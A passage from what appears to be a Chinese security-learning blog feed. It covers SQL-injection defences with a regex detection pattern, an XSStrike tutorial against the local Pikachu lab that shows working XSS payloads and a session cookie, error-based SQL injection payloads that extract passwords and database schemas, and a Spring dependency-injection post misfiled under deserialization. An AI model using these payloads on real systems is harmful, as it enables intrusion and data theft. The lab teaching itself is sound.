class="hljs-type">WHERE</span> <span class="hljs-title">user_id</span> = (:<span class="hljs-title">id</span>) <span class="hljs-type">LIMIT</span> 1;&#x27; );</span><br>$<span class="hljs-class"><span class="hljs-keyword">data</span>-&gt;bindParam( &#x27;:<span class="hljs-title">id&#x27;</span>, $<span class="hljs-title">id</span>, <span class="hljs-type">PDO</span>::<span class="hljs-type">PARAM_INT</span> );</span><br>$<span class="hljs-class"><span class="hljs-keyword">data</span>-&gt;execute();</span><br></code></pre></td></tr></table></figure><p>实例化PDO对象之后，首先是对请求SQL语句做预编译处理。在这里，我们使用了<strong>占位符的方式</strong>，将该SQL传入prepare函数后，预处理函数就会得到本次查询语句的SQL模板类，并将这个模板类返回，模板可以<strong>防止传那些危险变量</strong>改变本身查询语句的语义。然后使用 bindParam()函数对用户输入的数据和参数id进行绑定，最后再执行.</p><h3 id="使用正则表达式过滤"><a href="#使用正则表达式过滤" class="headerlink" title="使用正则表达式过滤"></a>使用正则表达式过滤</h3><p>正则表达式是一种用于匹配模式的工具，在检测 SQL 注入时非常有用。我们可以使用正则表达式来过滤和验证用户输入，以确保输入不包含任何恶意的 SQL 代码。下面是一些常见的正则表达式示例：</p><p>对用户输入的特殊字符进行严格过滤，如 ‘、”、&lt;、&gt;、&#x2F;、*、;、+、-、&amp;、|、(、)、and、or、select、union</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">pattern = re.<span class="hljs-built_in">compile</span>(<br><span class="hljs-string">r&quot;(%27)|(\&#x27;)|(\-\-)|(%23)|(#)|&quot;</span>  <span class="hljs-comment"># Regex for detection of SQL meta-characters</span><br><span class="hljs-string">r&quot;\w*((%27)|(\&#x27;))\s+((%6F)|o|(%4F))((%72)|r|(%52))\s*|&quot;</span>  <span class="hljs-comment"># Modified regex for detection of SQL meta-characters eg: &#x27; or 1 = 1&#x27; detect word &#x27;or&#x27;,</span><br><span class="hljs-string">r&quot;((%3D)|(=))[^\n]*((%27)|(\&#x27;)|(\-\-)|(%3B)|(;))&quot;</span>  <span class="hljs-comment"># Regex for typical SQL Injection attack eg: &#x27;= 1 --&#x27;</span><br><span class="hljs-string">r&quot;((%27)|(\&#x27;))union|&quot;</span>  <span class="hljs-comment"># Regex for detecting SQL Injection with the UNION keyword</span><br><span class="hljs-string">r&quot;((%27)|(\&#x27;))select|&quot;</span>  <span class="hljs-comment"># Regex for detecting SQL Injection with the UNION keyword</span><br><span class="hljs-string">r&quot;((%27)|(\&#x27;))insert|&quot;</span>  <span class="hljs-comment"># Regex for detecting SQL Injection with the UNION keyword</span><br><span class="hljs-string">r&quot;((%27)|(\&#x27;))update|&quot;</span>  <span class="hljs-comment"># Regex for detecting SQL Injection with the UNION keyword</span><br><span class="hljs-string">r&quot;((%27)|(\&#x27;))drop&quot;</span>,  <span class="hljs-comment"># Regex for detecting SQL Injection with the UNION keyword</span><br>re.IGNORECASE,<br>)<br>r = pattern.search(<span class="hljs-string">&quot;&#x27; OR 1 -- -&quot;</span>)<br><span class="hljs-keyword">if</span> r:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Web 应用中用于<strong>连接数据库的用户</strong>与<strong>数据库的系统管理员用户</strong>的权限有严格的区分（如不能执行 drop 等），并设置 Web 应用中用于连接数据库的用户不允许操作其他数据库。</p><p>设置 Web 应用中用于连接数据库的用户对 Web 目录不允许有写权限。</p><p>严格限定参数类型和格式，明确参数检验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查。</p><p>使用 Web 应用防火墙。</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>注入漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSStrike实战教程</title>
    <link href="/2024/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/%E5%AE%9E%E6%88%98/"/>
    <url>/2024/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h1 id="XSStrike的基本使用"><a href="#XSStrike的基本使用" class="headerlink" title="XSStrike的基本使用"></a>XSStrike的基本使用</h1><p>下面是他的常用命令</p><ul><li>-u url</li><li>–skip 跳过确认提示</li><li>–skip-dom 跳过dom型扫描</li><li>–data post型时的数据</li></ul><p>这里我们使用pikachu平台进行测试</p><h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p><img src="/.com//image-20250520023352-uo3hi74.png" alt="image"></p><p>这是最简单的，我们先手动submit一下看看url</p><p><img src="/.com//image-20250520023402-255gf3e.png" alt="image"></p><p>直接写payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python xsstrike.py -u <span class="hljs-string">&quot;http://127.0.0.1/pikachu-master/vul/xss/xss_reflected_get.php?message=k123&amp;submit=submit&quot;</span> --skip --skip-dom<br></code></pre></td></tr></table></figure><p>这就是根据刚刚的基本命令写的，最后两个参数就是跳过确认提示和跳过dom型扫描，因为已经说了是反射型了</p><p><img src="/.com//image-20250520023415-vfrekc7.png" alt="image">​</p><p>因为这个是最简单的xss所以有很多的payload，列出的payload都是成功的</p><p>比如第一个(注意payload包括括号)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://10.211.55.4/pikachu-master/vul/xss/xss_reflected_get.php?message=%3CdEtaIls/+/ontoggLE+=+[8].find(confirm)%3E&amp;submit=submit<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250520023440-tiuzgl6.png" alt="image"></p><p>点击详细信息就会弹窗（safari浏览器弹不了，只能用谷歌）</p><h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><hr><p>这个是需要登陆的，所以需要拿cookie</p><p><img src="/.com//image-20250520023454-xfhhd3j.png" alt="image"></p><p>这里传的参是通过post传的，所以还需要拿post</p><p>获取post可以抓包获取，也可以直接看请求</p><p><img src="/.com//image-20250520023501-fcokexp.png" alt="image"></p><p>点一下view source看完整的</p><p><img src="/.com//image-20250520023508-ywgokzv.png" alt="image"></p><p>这就是post请求了，然后再找cookie</p><p><img src="/.com//image-20250520023515-lv1zzz7.png" alt="image"></p><p>可以在控制台输入document.cookie来获取cookie</p><p>现在有了post请求和cookie就可以使用软件了</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python xsstrike.py -u <span class="hljs-string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xsspost/xss_reflected_post.php&quot;</span> --data <span class="hljs-string">&quot;message=1&amp;submit=submit&quot;</span> --headers <span class="hljs-string">&quot;Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=ik287bd9bniuabdun1psescmr3&quot;</span><br></code></pre></td></tr></table></figure></blockquote><p>要注意格式，需要自己添加Cookie:然后这后面又个空格</p><p><img src="/.com//image-20250520023535-u7joe1g.png" alt="image"></p><p>用第一个payload试一试</p><p><img src="/.com//image-20250520023542-25jl455.png" alt="image"></p><p>配合hackbar发送</p><p><img src="/.com//image-20250520023550-3xuog8w.png" alt="image"><img src="/.com//image-20250520023553-0kxick2.png" alt="image"></p><p>鼠标移动上去就弹窗</p><hr><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p><img src="/.com//image-20250520023610-8smbq12.png" alt="image"></p><p>这也是post发送的</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python xsstrike.py -u <span class="hljs-string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_stored.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;message=1&amp;submit=submit&quot;</span> <span class="hljs-params">--skip-dom</span> <span class="hljs-params">--skip</span><br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250520023623-pjrutwo.png" alt="image"></p><p>因为这是存储的，所以它测试的时候会不断传进去，及时按ctrl+c停止</p><p><img src="/.com//image-20250520023631-8diah4y.png" alt="image"><img src="/.com//image-20250520023634-zrbz4a5.png" alt="image"></p><hr><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>这个用XSStrike做不出来，如果有人可以做出来欢迎补充</p><hr><h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p><img src="/.com//image-20250520023650-yn41p64.png" alt="image"></p><p>通过get传参并且有回显，直接跑</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> xsstrike.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_01.php?message=13&amp;submit=submit&quot;</span> --skip<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250520023703-qk66wlr.png" alt="image"></p><p><img src="/.com//image-20250520023714-ujyvkd4.png" alt="image"><img src="/.com//image-20250520023717-tqnkd4v.png" alt="image"></p><hr><h2 id="XSS之HTML特殊字符"><a href="#XSS之HTML特殊字符" class="headerlink" title="XSS之HTML特殊字符"></a>XSS之HTML特殊字符</h2><p>这题用工具跑出来的payload用不了，会被转义</p><p>还是手动好</p><hr><h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p><img src="/.com//image-20250520023740-4kqh3ql.png" alt="image"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python xsstrike.py -u <span class="hljs-string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_03.php?message=123&amp;submit=submit&quot;</span> --skip<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250520023750-d85dkno.png" alt="image"></p><p><img src="/.com//image-20250520023753-b9ptlcx.png" alt="image"></p><hr><h2 id="XSS之href输出-1"><a href="#XSS之href输出-1" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>这题也不能靠工具</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
      <tag>XSStrike</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL报错注入技术</title>
    <link href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h3 id="报错注入常用的函数"><a href="#报错注入常用的函数" class="headerlink" title="报错注入常用的函数"></a>报错注入常用的函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">floor()<br><br>extractvalue()<br><br>updatexml()<br><br>geometrycollection()<br><br>multipoint()<br><br>polygon()<br><br>multipolygon()<br><br>linestring()<br>.。。。。。<br><br>这里介绍一个案例updatexml()。<br></code></pre></td></tr></table></figure><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>MySQL提供了一个<code>updatexml()</code>​函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。</p><p>我们尝试在查询用户id的同时，使用报错函数，在地址栏输入：<code>?id=1&#39; and updatexml(1, 0x7e, 3) -- a</code>​</p><p>参数2内容中的查询结果显示在数据库的报错信息中，并回显到页面。</p><p><img src="/.com//image-20250519092815-g702fvt.png" alt="image"></p><p>​<code>version()</code>​：返回数据库版本<code>concat()</code>​：拼接特殊符号和查询结果</p><p>​<code>updatexml()</code>​函数的报错内容长度不能超过32个字符，常用的解决方式有两种：</p><ol><li>​<code>limit</code>​：分页</li><li>​<code>substr()</code>​：截取字符</li></ol><hr><h4 id="1-1-limit分页"><a href="#1-1-limit分页" class="headerlink" title="1.1 limit分页"></a>1.1 limit分页</h4><p>例如，已知users表中包含username和password两个字段，显示出某个password字段的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; and updatexml(1, concat(0x7e,(select password from users limit 0,1)), 3) -- a</span><br></code></pre></td></tr></table></figure><p>使用<code>group_concat(字段名)</code>​显示出最高32位字符长度，password字段的数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x7e,(select group_concat(password) from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)), <span class="hljs-number">3</span>) -- a<br></code></pre></td></tr></table></figure><hr><h4 id="1-2-substr"><a href="#1-2-substr" class="headerlink" title="1.2 substr()"></a>1.2 substr()</h4><p>适用情况：页面有数据库报错信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.网站信息必须是动态的，来自数据库的报错信息。<br>2.网站写死的、自定义的报错信息不算<br></code></pre></td></tr></table></figure><p>1.判断是否报错</p><p>参数中添加单&#x2F;双引号，页面报错才可进行下一步。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-comment">-- a</span><br></code></pre></td></tr></table></figure><p>2.判断报错条件</p><p>参数中添加报错函数，检查报错信息是否正常回显。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,<span class="hljs-string">&#x27;~&#x27;</span>,3) -- a <br></code></pre></td></tr></table></figure><ol start="3"><li>脱库</li></ol><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//获取所有数据库</span><br>?id=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),1,31)),3) -- qwq </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">//获取所有表</span></span><br><span class="hljs-function">?id</span>=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span> =<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>) -- qwq<br><br><span class="hljs-comment">//获取所有字段</span><br>?id=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema</span> =<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>) -- qwq<br></code></pre></td></tr></table></figure><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>报错注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化对象注入</title>
    <link href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a>对象注入</h1><h3 id="一，实现方式的使用"><a href="#一，实现方式的使用" class="headerlink" title="一，实现方式的使用"></a>一，实现方式的使用</h3><p>对象注入也可被称为对象装配，是把Bean对象获取出来放到某个类中。</p><p>对象注入的实现方式有3种，分别为<strong>属性注入</strong>，<strong>Setter注入</strong>和<strong>构造方法注入</strong>。</p><p>为了更好地理解对象注入的实现方式，搞个实例来具体说明：</p><h4 id="1-0，前期准备"><a href="#1-0，前期准备" class="headerlink" title="1.0，前期准备"></a>1.0，前期准备</h4><p><strong>1，准备Service类</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">@Service<br>public class StudentService &#123;<br>    public void <span class="hljs-function"><span class="hljs-title">sayHi</span></span>()&#123;<br>        System.out.println(<span class="hljs-string">&quot;do student service sayHi()&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>示例问题：将 Service 类注入到 Controller 类中，对象注入实现：</p><h4 id="1-1，属性注入"><a href="#1-1，属性注入" class="headerlink" title="1.1，属性注入"></a>1.1，属性注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">@Controller<br>public class StudentController &#123;<br>    //注入方式：属性注入<br>    @Autowired<br>    private StudentService studentService;<br>    public void <span class="hljs-function"><span class="hljs-title">sayHi</span></span>()&#123;<br>        System.out.println(<span class="hljs-string">&quot;do student controller sayHi()&quot;</span>);<br>        studentService.sayHi();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3，启动类执行结果：</strong></p><p><img src="/.com//%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/assets/image-20250519113413-r3ei7ob.png" alt="image"></p><h4 id="1-2，Setter注入"><a href="#1-2，Setter注入" class="headerlink" title="1.2，Setter注入"></a>1.2，Setter注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">@Controller<br>public class StudentController &#123;<br>    private StudentService studentService;<br>    @Autowired<br>    public void setStudentService(StudentService studentService) &#123;<br>        this.studentService = studentService;<br>    &#125;<br>    public void <span class="hljs-function"><span class="hljs-title">sayHi</span></span>()&#123;<br>        System.out.println(<span class="hljs-string">&quot;do student controller sayHi()&quot;</span>);<br>        studentService.sayHi();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2，启动类实现代码：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">public class App &#123;<br>    public static void main(String[] args) &#123;<br>        //1，获取Spring上下文<br>        ApplicationContext applicationContext =<br>                new ClassPathXmlApplicationContext(<span class="hljs-string">&quot;spring-config.xml&quot;</span>);<br>        //2,得到Bean对象<br>        StudentController studentController =<br>                applicationContext.getBean(<span class="hljs-string">&quot;studentController&quot;</span>,StudentController.class);<br>        //3,使用Bean对象<br>        studentController.sayHi();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3，启动类执行结果：</strong></p><p><img src="/.com//%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/assets/image-20250519113413-r3ei7ob.png" alt="image"></p><h4 id="1-3，构造方法注入"><a href="#1-3，构造方法注入" class="headerlink" title="1.3，构造方法注入"></a>1.3，构造方法注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">@Controller<br>public class StudentController &#123;<br>    private StudentService studentService;<br>    @Autowired<br>    public StudentController(StudentService studentService) &#123;<br>        this.studentService = studentService;<br>    &#125;<br>    public void <span class="hljs-function"><span class="hljs-title">sayHi</span></span>()&#123;<br>        System.out.println(<span class="hljs-string">&quot;do student controller sayHi()&quot;</span>);<br>        studentService.sayHi();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2，启动类实现代码：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">public class App &#123;<br>    public static void main(String[] args) &#123;<br>        //1，获取Spring上下文<br>        ApplicationContext applicationContext =<br>                new ClassPathXmlApplicationContext(<span class="hljs-string">&quot;spring-config.xml&quot;</span>);<br>        //2,得到Bean对象<br>        StudentController studentController =<br>                applicationContext.getBean(<span class="hljs-string">&quot;studentController&quot;</span>,StudentController.class);<br>        //3,使用Bean对象<br>        studentController.sayHi();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3，启动类执行结果：</strong></p><p><img src="/.com//%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/assets/image-20250519113413-r3ei7ob.png" alt="image"></p><hr><h3 id="二，方式的优缺点分析"><a href="#二，方式的优缺点分析" class="headerlink" title="二，方式的优缺点分析"></a>二，方式的优缺点分析</h3><h4 id="2-1，属性注入"><a href="#2-1，属性注入" class="headerlink" title="2.1，属性注入"></a>2.1，属性注入</h4><p><strong>1，方式实现代码：</strong></p><p><img src="/.com//%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/assets/image-20250519113909-9naesmp.png" alt="image"></p><p><strong>2，方式优点：</strong></p><ul><li>实现简单，易于理解和维护</li></ul><p><strong>3，方式缺点：</strong></p><ul><li>不能注入不可变对象【final 修饰的变量】</li><li>通用性差，只适用于IoC容器，在非IoC框架中无效</li><li>更容易违背单一设计原则</li></ul><h4 id="2-2，Setter注入"><a href="#2-2，Setter注入" class="headerlink" title="2.2，Setter注入"></a>2.2，Setter注入</h4><p><strong>1，方式实现代码：</strong></p><p><img src="/.com//%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/assets/image-20250519114004-n40tgzk.png" alt="image"></p><p><strong>2，方式优点：</strong></p><ul><li>符合单一设计原则【每个方法只传递一个对象】</li></ul><p><strong>3，方式缺点：</strong></p><ul><li>不能注入不可变对象【final 修饰的变量】</li><li>使用Setter注入的对象可能被修改</li></ul><h4 id="2-3，构造方法注入"><a href="#2-3，构造方法注入" class="headerlink" title="2.3，构造方法注入"></a>2.3，构造方法注入</h4><p><strong>1，方式实现代码：</strong></p><p><img src="/.com//%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/assets/image-20250519114010-b66tqw9.png" alt="image"></p><p>注意：如果只有一个构造方法，那么 @Autowired 注解可以省略。</p><p><strong>2，方式优点：</strong></p><p>可以注入不可变对象【final 修饰的变量】</p><p>注入对象不会被改变【构造方法只执行一次】</p><p>注入对象会完全被初始化</p><p>通用性更好，可在IoC容器中使用，也可在非IoC中使用</p><p><strong>3，方式缺点：</strong></p><p>不符合单一设计原则【每个方法可传递多个对象】</p><hr><h3 id="三，对象注入中的问题"><a href="#三，对象注入中的问题" class="headerlink" title="三，对象注入中的问题"></a>三，对象注入中的问题</h3><h4 id="3-1，-Autowired-和-Resource"><a href="#3-1，-Autowired-和-Resource" class="headerlink" title="3.1，@Autowired 和 @Resource"></a>3.1，@Autowired 和 @Resource</h4><p>在进行类注入时，除了可以使用<code>@Autowired</code>​注解之外，我们还可以使用<code>@Resource</code>​注解进行注入。</p><p><img src="/.com//%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/assets/image-20250519114041-uhz25b2.png" alt="image"></p><p>​<code>@Autowired</code>​ 和 <code>@Resource</code>​ 都是在 <a href="https://so.csdn.net/so/search?q=Spring%20%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">Spring 框架</a>中用于注入依赖的注解，它们有以下区别：</p><ol><li><p><strong>来源不同：</strong></p><ul><li>​<code>@Autowired</code>​ 是 Spring 框架提供的注解，通过类型进行依赖注入。</li><li>​<code>@Resource</code>​ 是 JavaEE 